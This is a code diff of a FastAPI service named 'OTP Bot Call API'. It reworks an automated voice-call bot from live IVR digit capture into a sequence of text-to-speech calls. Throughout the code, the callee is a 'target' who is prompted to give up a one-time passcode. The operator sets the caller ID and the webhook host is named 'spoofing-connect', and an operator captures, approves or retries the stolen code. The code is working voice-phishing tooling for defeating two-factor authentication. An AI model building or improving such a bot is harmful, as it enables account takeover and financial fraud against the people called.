@@ -28,7 +28,6 @@ db = client[os.environ['DB_NAME']]
 # Infobip configuration
 INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY')
 INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', 'qdnddq.api.infobip.com')
-INFOBIP_CALLS_CONFIG_ID = os.environ.get('INFOBIP_CALLS_CONFIG_ID')
 
 # Webhook base URL
 WEBHOOK_BASE_URL = "https://spoofing-connect.preview.emergentagent.com/api"
@@ -55,7 +54,7 @@ app = FastAPI(title="OTP Bot Call API", version="2.0.0")
 # Create Socket.IO ASGI app
 socket_app = socketio.ASGIApp(sio, app)
 
-# Store active calls for IVR state management
+# Store active sessions
 active_sessions: Dict[str, Dict[str, Any]] = {}
 
 # Create routers
@@ -209,7 +208,7 @@ async def emit_log(session_id: str, log_type: str, message: str, data: dict = No
     await sio.emit('call_log', log_entry, room=session_id)
     logger.info(f"[{session_id}] {log_type}: {message}")
 
-# ==================== INFOBIP CALLS API HELPERS ====================
+# ==================== INFOBIP API HELPERS ====================
 
 def get_infobip_headers():
     return {
@@ -222,73 +221,31 @@ def get_infobip_url(path: str) -> str:
     base = INFOBIP_BASE_URL if INFOBIP_BASE_URL.startswith('http') else f"https://{INFOBIP_BASE_URL}"
     return f"{base}{path}"
 
-async def infobip_request(method: str, path: str, data: dict = None) -> dict:
-    """Make request to Infobip API"""
-    url = get_infobip_url(path)
+async def send_tts_call(to_number: str, from_number: str, text: str, language: str = "en", speech_rate: float = 0.95) -> dict:
+    """Send TTS call using Infobip TTS Advanced API"""
+    url = get_infobip_url("/tts/3/advanced")
     headers = get_infobip_headers()
     
+    payload = {
+        "messages": [{
+            "from": from_number,
+            "destinations": [{"to": to_number}],
+            "text": text,
+            "language": language,
+            "speechRate": speech_rate,
+            "notifyUrl": f"{WEBHOOK_BASE_URL}/otp/webhook/tts",
+            "notifyContentType": "application/json"
+        }]
+    }
+    
     async with httpx.AsyncClient(timeout=30.0) as http_client:
-        if method == "POST":
-            response = await http_client.post(url, headers=headers, json=data)
-        elif method == "GET":
-            response = await http_client.get(url, headers=headers)
-        else:
-            raise ValueError(f"Unsupported method: {method}")
-        
-        logger.info(f"Infobip {method} {path}: {response.status_code}")
-        logger.info(f"Response: {response.text[:500]}")
+        response = await http_client.post(url, headers=headers, json=payload)
+        logger.info(f"TTS API response: {response.status_code} - {response.text[:500]}")
         
         if response.status_code in [200, 201]:
             return response.json()
         else:
-            raise Exception(f"Infobip API error: {response.status_code} - {response.text}")
-
-async def create_call(session_id: str, to_number: str, from_number: str) -> str:
-    """Create outbound call using Infobip Calls API"""
-    payload = {
-        "endpoint": {
-            "type": "PHONE",
-            "phoneNumber": to_number
-        },
-        "from": from_number,
-        "callsConfigurationId": INFOBIP_CALLS_CONFIG_ID,
-        "customData": {
-            "sessionId": session_id
-        }
-    }
-    
-    result = await infobip_request("POST", "/calls/1/calls", payload)
-    return result.get("id")
-
-async def play_tts(call_id: str, text: str, language: str = "en", voice_name: str = "Joanna"):
-    """Play TTS message on active call"""
-    payload = {
-        "text": text,
-        "language": language,
-        "voiceName": voice_name
-    }
-    
-    await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)
-
-async def collect_dtmf(call_id: str, max_digits: int, timeout: int = 10, play_text: str = None, language: str = "en"):
-    """Collect DTMF digits from caller"""
-    payload = {
-        "maxLength": max_digits,
-        "timeout": timeout,
-        "terminator": "#"
-    }
-    
-    if play_text:
-        payload["playContent"] = {
-            "text": play_text,
-            "language": language
-        }
-    
-    await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf", payload)
-
-async def hangup_call(call_id: str):
-    """Hangup the call"""
-    await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})
+            raise Exception(f"TTS API error: {response.status_code} - {response.text}")
 
 # ==================== AUTH ROUTES ====================
 
@@ -339,11 +296,11 @@ async def get_me(current_user: dict = Depends(get_current_user)):
         created_at=current_user["created_at"]
     )
 
-# ==================== OTP BOT ROUTES WITH IVR ====================
+# ==================== OTP BOT ROUTES ====================
 
 @otp_router.post("/initiate-call")
 async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(get_current_user)):
-    """Initiate an OTP bot call with IVR support"""
+    """Initiate an OTP bot call - Step 1"""
     
     session_id = str(uuid.uuid4())
     now = datetime.now(timezone.utc).isoformat()
@@ -365,11 +322,10 @@ async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(
         "language": config.language,
         "voice_name": config.voice_name,
         "status": "initiating",
-        "current_step": 0,
-        "dtmf_input": "",
+        "current_step": 1,
         "first_input": None,
         "otp_received": None,
-        "call_id": None,
+        "message_ids": [],
         "created_at": now,
         "logs": [],
         "messages": {
@@ -382,300 +338,231 @@ async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(
     }
     
     await db.otp_sessions.insert_one(session_doc)
-    
-    # Store in active sessions for webhook handling
     active_sessions[session_id] = session_doc
     
     await emit_log(session_id, "info", "🤖 OTP Bot initialized")
     await emit_log(session_id, "call", f"🚦 Initiating call to {config.recipient_number}")
     
     try:
-        # Create call using Infobip Calls API
-        call_id = await create_call(session_id, config.recipient_number, config.caller_id)
+        # Send Step 1 TTS call
+        result = await send_tts_call(
+            config.recipient_number,
+            config.caller_id,
+            step1_text,
+            config.language,
+            0.95
+        )
         
-        # Update session with call ID
+        message_id = result.get("messages", [{}])[0].get("messageId")
+        
         await db.otp_sessions.update_one(
             {"id": session_id},
-            {"$set": {"call_id": call_id, "status": "ringing"}}
+            {"$set": {"status": "step1"}, "$push": {"message_ids": message_id}}
         )
-        active_sessions[session_id]["call_id"] = call_id
         
-        await emit_log(session_id, "success", f"📲 Call created successfully", {"call_id": call_id})
+        await emit_log(session_id, "success", f"📲 Call initiated - Step 1", {"message_id": message_id})
+        await emit_log(session_id, "step", "🎙️ Playing Step 1: Greeting message")
+        await emit_log(session_id, "info", "📞 Target phone is ringing...")
         
         return {
             "session_id": session_id,
-            "call_id": call_id,
-            "status": "ringing"
+            "message_id": message_id,
+            "status": "step1",
+            "message": "Step 1 call initiated. Monitor target's response manually."
         }
         
     except Exception as e:
         error_msg = str(e)
-        logger.error(f"Failed to create call: {error_msg}")
+        logger.error(f"Failed to initiate call: {error_msg}")
         
         await db.otp_sessions.update_one(
             {"id": session_id},
             {"$set": {"status": "failed", "error": error_msg}}
         )
-        await emit_log(session_id, "error", f"❌ Failed to create call: {error_msg}")
+        await emit_log(session_id, "error", f"❌ Failed: {error_msg}")
         
         raise HTTPException(status_code=500, detail=error_msg)
 
-@otp_router.post("/webhook/call-events")
-async def handle_call_events(request: Request):
-    """Handle Infobip call events webhook"""
+@otp_router.post("/step2/{session_id}")
+async def send_step2(session_id: str, first_input: str = "1", current_user: dict = Depends(get_current_user)):
+    """Send Step 2 - OTP request message"""
+    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    if not session:
+        raise HTTPException(status_code=404, detail="Session not found")
+    
+    await emit_log(session_id, "dtmf", f"➡️ Target pressed: {first_input}")
+    
     try:
-        body = await request.json()
-        logger.info(f"Call event received: {json.dumps(body, indent=2)}")
+        step2_text = session["messages"]["step2"]
         
-        # Get session ID from custom data or find by call ID
-        call_id = body.get("callId") or body.get("id")
-        custom_data = body.get("customData", {})
-        session_id = custom_data.get("sessionId")
+        result = await send_tts_call(
+            session["recipient_number"],
+            session["caller_id"],
+            step2_text,
+            session.get("language", "en"),
+            0.95
+        )
         
-        if not session_id:
-            # Find session by call ID
-            session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
-            if session:
-                session_id = session["id"]
+        message_id = result.get("messages", [{}])[0].get("messageId")
         
-        if not session_id:
-            logger.warning(f"No session found for call {call_id}")
-            return {"status": "no_session"}
+        await db.otp_sessions.update_one(
+            {"id": session_id},
+            {
+                "$set": {"status": "step2", "current_step": 2, "first_input": first_input},
+                "$push": {"message_ids": message_id}
+            }
+        )
         
-        # Get session from memory or DB
-        session = active_sessions.get(session_id)
-        if not session:
-            session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
-            if session:
-                active_sessions[session_id] = session
+        await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP request message")
+        await emit_log(session_id, "info", "⏳ Waiting for target to enter OTP...")
         
-        if not session:
-            return {"status": "session_not_found"}
-        
-        event_type = body.get("type") or body.get("state")
-        
-        if event_type == "CALL_RINGING":
-            await emit_log(session_id, "info", "📞 Call ringing...")
-            
-        elif event_type == "CALL_ESTABLISHED" or event_type == "ESTABLISHED":
-            await emit_log(session_id, "success", "✅ Call answered!")
-            await db.otp_sessions.update_one(
-                {"id": session_id},
-                {"$set": {"status": "step1", "current_step": 1}}
-            )
-            
-            # Play Step 1 message and collect single digit
-            await emit_log(session_id, "step", "🎙️ Playing Step 1: Greeting message")
-            
-            step1_text = session["messages"]["step1"]
-            await collect_dtmf(
-                call_id, 
-                max_digits=1, 
-                timeout=30,
-                play_text=step1_text,
-                language=session.get("language", "en")
-            )
-            
-        elif event_type == "CALL_FINISHED" or event_type == "FINISHED":
-            reason = body.get("errorCode", {}).get("name") or body.get("reason", "completed")
-            await emit_log(session_id, "info", f"📴 Call ended: {reason}")
-            await db.otp_sessions.update_one(
-                {"id": session_id},
-                {"$set": {"status": "completed"}}
-            )
-            
-            # Clean up active session
-            if session_id in active_sessions:
-                del active_sessions[session_id]
-                
-        elif event_type == "CALL_FAILED":
-            error = body.get("errorCode", {}).get("description", "Unknown error")
-            await emit_log(session_id, "error", f"❌ Call failed: {error}")
-            await db.otp_sessions.update_one(
-                {"id": session_id},
-                {"$set": {"status": "failed"}}
-            )
-        
-        return {"status": "processed"}
+        return {"status": "step2", "message_id": message_id}
         
     except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return {"status": "error", "message": str(e)}
+        await emit_log(session_id, "error", f"❌ Step 2 failed: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
 
-@otp_router.post("/webhook/dtmf")
-async def handle_dtmf_webhook(request: Request):
-    """Handle DTMF input webhook from Infobip"""
+@otp_router.post("/submit-otp/{session_id}")
+async def submit_otp(session_id: str, otp_code: str, current_user: dict = Depends(get_current_user)):
+    """Submit OTP received from target"""
+    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    if not session:
+        raise HTTPException(status_code=404, detail="Session not found")
+    
+    await emit_log(session_id, "otp", f"🕵️ OTP submitted: {otp_code}", {"otp": otp_code})
+    
     try:
-        body = await request.json()
-        logger.info(f"DTMF event received: {json.dumps(body, indent=2)}")
+        # Send Step 3 - verification wait message
+        step3_text = session["messages"]["step3"]
         
-        call_id = body.get("callId")
-        dtmf_value = body.get("dtmf") or body.get("value") or ""
+        result = await send_tts_call(
+            session["recipient_number"],
+            session["caller_id"],
+            step3_text,
+            session.get("language", "en"),
+            0.95
+        )
         
-        # Find session by call ID
-        session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
-        if not session:
-            logger.warning(f"No session found for DTMF on call {call_id}")
-            return {"status": "no_session"}
+        message_id = result.get("messages", [{}])[0].get("messageId")
         
-        session_id = session["id"]
-        current_step = session.get("current_step", 1)
-        otp_digits = session.get("otp_digits", 6)
+        await db.otp_sessions.update_one(
+            {"id": session_id},
+            {
+                "$set": {"status": "waiting_approval", "current_step": 3, "otp_received": otp_code},
+                "$push": {"message_ids": message_id}
+            }
+        )
         
-        await emit_log(session_id, "dtmf", f"➡️ DTMF received: {dtmf_value}")
+        await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification wait message")
+        await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
         
-        if current_step == 1:
-            # First input (1 or 0)
-            await emit_log(session_id, "info", f"👆 Target pressed: {dtmf_value}")
-            
-            await db.otp_sessions.update_one(
-                {"id": session_id},
-                {"$set": {"first_input": dtmf_value, "current_step": 2, "status": "step2"}}
-            )
-            
-            # Move to Step 2 - collect OTP
-            await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP request")
-            
-            step2_text = session["messages"]["step2"]
-            await collect_dtmf(
-                call_id,
-                max_digits=otp_digits,
-                timeout=60,
-                play_text=step2_text,
-                language=session.get("language", "en")
-            )
-            
-        elif current_step == 2:
-            # OTP digits received
-            otp_code = dtmf_value.replace("#", "")
-            
-            if len(otp_code) >= otp_digits:
-                otp_code = otp_code[:otp_digits]
-                
-                await emit_log(session_id, "otp", f"🕵️ OTP submitted: {otp_code}", {"otp": otp_code})
-                
-                # Play step 3 and wait for admin
-                await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification wait")
-                
-                step3_text = session["messages"]["step3"]
-                await play_tts(call_id, step3_text, session.get("language", "en"), session.get("voice_name", "Joanna"))
-                
-                await db.otp_sessions.update_one(
-                    {"id": session_id},
-                    {"$set": {
-                        "otp_received": otp_code,
-                        "current_step": 3,
-                        "status": "waiting_approval"
-                    }}
-                )
-                
-                await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
-            else:
-                await emit_log(session_id, "warning", f"⚠️ Incomplete OTP: {otp_code} ({len(otp_code)}/{otp_digits} digits)")
-        
-        return {"status": "processed"}
+        return {"status": "waiting_approval", "otp": otp_code}
         
     except Exception as e:
-        logger.error(f"DTMF webhook error: {e}")
-        return {"status": "error", "message": str(e)}
+        await emit_log(session_id, "error", f"❌ Failed: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
 
 @otp_router.post("/accept/{session_id}")
 async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
-    """Admin accepts the OTP - play accepted message and end call"""
+    """Admin accepts the OTP - play accepted message"""
     session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
     if not session:
         raise HTTPException(status_code=404, detail="Session not found")
     
-    call_id = session.get("call_id")
-    if not call_id:
-        raise HTTPException(status_code=400, detail="No active call")
-    
     await emit_log(session_id, "action", "✅ Admin pressed ACCEPT")
-    await emit_log(session_id, "step", "🎙️ Playing Accepted message")
     
     try:
-        # Play accepted message
         accepted_text = session["messages"]["accepted"]
-        await play_tts(call_id, accepted_text, session.get("language", "en"), session.get("voice_name", "Joanna"))
         
-        # Wait a bit then hangup
-        await asyncio.sleep(5)
-        await hangup_call(call_id)
+        result = await send_tts_call(
+            session["recipient_number"],
+            session["caller_id"],
+            accepted_text,
+            session.get("language", "en"),
+            0.95
+        )
         
+        await db.otp_sessions.update_one(
+            {"id": session_id},
+            {"$set": {"status": "completed", "result": "accepted"}}
+        )
+        
+        await emit_log(session_id, "step", "🎙️ Playing Accepted message")
         await emit_log(session_id, "success", "📴 Call completed successfully")
         
+        return {"status": "accepted", "otp": session.get("otp_received")}
+        
     except Exception as e:
-        logger.error(f"Error in accept: {e}")
-        await emit_log(session_id, "error", f"Error playing message: {str(e)}")
-    
-    await db.otp_sessions.update_one(
-        {"id": session_id},
-        {"$set": {"status": "completed", "result": "accepted"}}
-    )
-    
-    return {"status": "accepted", "otp": session.get("otp_received")}
+        await emit_log(session_id, "error", f"❌ Failed: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
 
 @otp_router.post("/reject/{session_id}")
 async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
-    """Admin rejects the OTP - play retry message and collect again"""
+    """Admin rejects the OTP - play retry message"""
     session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
     if not session:
         raise HTTPException(status_code=404, detail="Session not found")
-    
-    call_id = session.get("call_id")
-    if not call_id:
-        raise HTTPException(status_code=400, detail="No active call")
     
     await emit_log(session_id, "action", "❌ Admin pressed REJECT")
-    await emit_log(session_id, "step", "🎙️ Playing Retry message")
     
     try:
-        # Play rejected message and collect again
         rejected_text = session["messages"]["rejected"]
-        otp_digits = session.get("otp_digits", 6)
         
-        await collect_dtmf(
-            call_id,
-            max_digits=otp_digits,
-            timeout=60,
-            play_text=rejected_text,
-            language=session.get("language", "en")
+        result = await send_tts_call(
+            session["recipient_number"],
+            session["caller_id"],
+            rejected_text,
+            session.get("language", "en"),
+            0.95
         )
         
+        await db.otp_sessions.update_one(
+            {"id": session_id},
+            {"$set": {"status": "step2", "current_step": 2, "otp_received": None}}
+        )
+        
+        await emit_log(session_id, "step", "🎙️ Playing Retry message")
         await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
         
+        return {"status": "rejected"}
+        
     except Exception as e:
-        logger.error(f"Error in reject: {e}")
-        await emit_log(session_id, "error", f"Error: {str(e)}")
-    
-    await db.otp_sessions.update_one(
-        {"id": session_id},
-        {"$set": {"status": "step2", "current_step": 2, "otp_received": None}}
-    )
-    
-    return {"status": "rejected"}
+        await emit_log(session_id, "error", f"❌ Failed: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
 
-@otp_router.post("/hangup/{session_id}")
-async def hangup_session(session_id: str, current_user: dict = Depends(get_current_user)):
-    """Manually hangup the call"""
-    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
-    if not session:
-        raise HTTPException(status_code=404, detail="Session not found")
-    
-    call_id = session.get("call_id")
-    if call_id:
-        try:
-            await hangup_call(call_id)
-            await emit_log(session_id, "info", "📴 Call ended by admin")
-        except Exception as e:
-            logger.error(f"Error hanging up: {e}")
-    
-    await db.otp_sessions.update_one(
-        {"id": session_id},
-        {"$set": {"status": "completed"}}
-    )
-    
-    return {"status": "hangup"}
+@otp_router.post("/webhook/tts")
+async def handle_tts_webhook(request: Request):
+    """Handle TTS delivery webhooks"""
+    try:
+        body = await request.json()
+        logger.info(f"TTS webhook received: {json.dumps(body, indent=2)}")
+        
+        results = body.get("results", [])
+        for result in results:
+            message_id = result.get("messageId")
+            status_info = result.get("status", {})
+            status_name = status_info.get("name", "").upper()
+            
+            # Find session by message ID
+            session = await db.otp_sessions.find_one(
+                {"message_ids": message_id},
+                {"_id": 0}
+            )
+            
+            if session:
+                session_id = session["id"]
+                
+                if status_name == "DELIVERED":
+                    await emit_log(session_id, "success", "✅ Message delivered to target")
+                elif status_name == "PENDING_ACCEPTED":
+                    await emit_log(session_id, "info", "📞 Call ringing...")
+                elif status_name == "FAILED" or status_name == "REJECTED":
+                    await emit_log(session_id, "error", f"❌ Call failed: {status_info.get('description', 'Unknown')}")
+        
+        return {"status": "received"}
+    except Exception as e:
+        logger.error(f"Webhook error: {e}")
+        return {"status": "error"}
 
 @otp_router.get("/session/{session_id}")
 async def get_otp_session(session_id: str, current_user: dict = Depends(get_current_user)):
@@ -694,7 +581,7 @@ async def get_otp_sessions(current_user: dict = Depends(get_current_user)):
     ).sort("created_at", -1).limit(50).to_list(50)
     return sessions
 
-# ==================== VOICE ROUTES (Simple TTS) ====================
+# ==================== VOICE ROUTES ====================
 
 @voice_router.post("/call", response_model=CallRecord)
 async def send_voice_call(
@@ -730,19 +617,8 @@ async def send_voice_call(
     
     full_message = (message_text + ". . . ") * repeat_count
     
-    headers = get_infobip_headers()
-    payload = {
-        "messages": [{
-            "from": caller_id,
-            "destinations": [{"to": phone_number}],
-            "text": full_message,
-            "language": language,
-            "speechRate": speech_rate
-        }]
-    }
-    
     try:
-        result = await infobip_request("POST", "/tts/3/advanced", payload)
+        result = await send_tts_call(phone_number, caller_id, full_message, language, speech_rate)
         infobip_message_id = result.get("messages", [{}])[0].get("messageId")
         
         await db.calls.update_one(
@@ -803,11 +679,11 @@ async def get_call_stats(current_user: dict = Depends(get_current_user)):
 
 @api_router.get("/")
 async def root():
-    return {"message": "OTP Bot Call API v2.0 with IVR"}
+    return {"message": "OTP Bot Call API v2.0"}
 
 @api_router.get("/health")
 async def health_check():
-    return {"status": "healthy", "service": "otp-bot-api", "ivr": "enabled"}
+    return {"status": "healthy", "service": "otp-bot-api"}
 
 # Include routers
 api_router.include_router(auth_router)
